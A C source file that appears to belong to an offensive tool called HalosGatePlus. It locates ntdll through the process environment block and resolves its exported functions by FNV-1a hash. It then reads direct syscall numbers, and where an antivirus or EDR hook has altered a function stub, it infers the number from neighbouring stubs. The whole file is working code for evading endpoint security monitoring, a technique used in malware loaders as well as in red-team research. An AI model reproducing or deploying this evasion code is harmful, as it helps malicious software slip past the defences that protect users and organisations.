#include "HalosGatePlus.h"

UINT32 fnva(const char* str) {
	UINT32 hash = 0x811C9DC5;
	UINT32 prime = 0x01000193;

	while (*str) {
		hash ^= (BYTE)(*str++);
		hash *= prime;
	}
	return hash;
}


GateCallCtx* GateNewCtx() {


	GateCallCtx* ctx = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(GateCallCtx));

	if (ctx == NULL) {
		return NULL;
	}

	PTEB pTeb = NtCurrentTeb();

	if (!pTeb) {
		return NULL;
	}

	PPEB pPeb = pTeb->ProcessEnvironmentBlock;

	if (!pPeb) {
		return NULL;
	}

	LDR_DATA_TABLE_ENTRY* ntdllEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	BYTE* ntdllBase = ntdllEntry->DllBase;

	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)(ntdllBase);
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(ntdllBase + pDos->e_lfanew);
	
	PIMAGE_DATA_DIRECTORY dataDirectory = pNt->OptionalHeader.DataDirectory;

	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(ntdllBase + dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	ctx->exportDir = exportDir;
	ctx->dllBase = ntdllBase;
	ctx->wSSN = 0;

	ctx->Cached = 0;

	return ctx;

}


WORD FindSyscall(BYTE* base, INT index) {

	INT offset = 0x20 * index;

	BYTE* callBase = (BYTE*)(base + offset);

	if (
		*(callBase) == 0x4C &&
		*(callBase + 1) == 0x8B &&
		*(callBase + 2) == 0xD1 &&
		*(callBase + 3) == 0xB8
		) {

		// ssn
		return *(WORD*)(callBase + 4);

	}

	return 0;

}


// Initializing ssn before call
VOID GateInitCall(GateCallCtx* ctx, UINT32 funcHash) {


	// search if cached
	for (int i = 0; i < ctx->Cached; i++) {

		// found hash
		if (ctx->Cache[i].hash == funcHash) {
			//printf("[+] Found cached\n");
			ctx->wSSN = ctx->Cache[i].ssn; // init syscall
			GateInit(ctx->wSSN);
			return; // back

		}

	}

	DWORD* addressOfNames = (DWORD*)(ctx->dllBase + ctx->exportDir->AddressOfNames);
	DWORD* addressOfFuncs = (DWORD*)(ctx->dllBase + ctx->exportDir->AddressOfFunctions);
	WORD* addressOfOrdinals = (WORD*)(ctx->dllBase + ctx->exportDir->AddressOfNameOrdinals);

	for (int i = 0; i < ctx->exportDir->NumberOfNames; i++) {

		CHAR* funcName = ctx->dllBase + addressOfNames[i];

		if (fnva(funcName) == funcHash) {
			//printf("[+] Found match: %s 0x%x\n", funcName, funcHash);

			WORD ord = addressOfOrdinals[i];
			BYTE* funcAddress = (BYTE*)(ctx->dllBase + addressOfFuncs[ord]);


			// mov r10,rcx
			// mov eax,...
			if (
				*(funcAddress) == 0x4C &&
				*(funcAddress + 1) == 0x8B &&
				*(funcAddress + 2) == 0xD1 &&
				*(funcAddress + 3) == 0xB8
				) {

				ctx->wSSN = *(WORD*)(funcAddress + 4);

				// cache call

			}
			else { // hooked
				//printf("[+] Function is hooked\n");
				ctx->wSSN = 0;

				INT index = 1;
				WORD retSSN = 0;

				while (ctx->wSSN == 0 && index != 500) {


					// search up
					retSSN = FindSyscall(funcAddress, index);
					if (retSSN) {
						//printf("Found UP\n");
						ctx->wSSN = retSSN - index;
					}
					// search down
					else {
						retSSN = FindSyscall(funcAddress, -index);
						//printf("Found Down\n");
						if (retSSN) {
							ctx->wSSN = retSSN + index;
						}
					}

					index++;

				}


			}

			if (ctx->Cached < MAX_CALLS_CACHE) {

				ctx->Cache[ctx->Cached].ssn = ctx->wSSN;
				ctx->Cache[ctx->Cached].hash = funcHash;
				ctx->Cached++;
			}

			GateInit(ctx->wSSN);

			//printf("%d\n", ctx->wSSN);


			return;

		} // hash condition

	} // loop

}
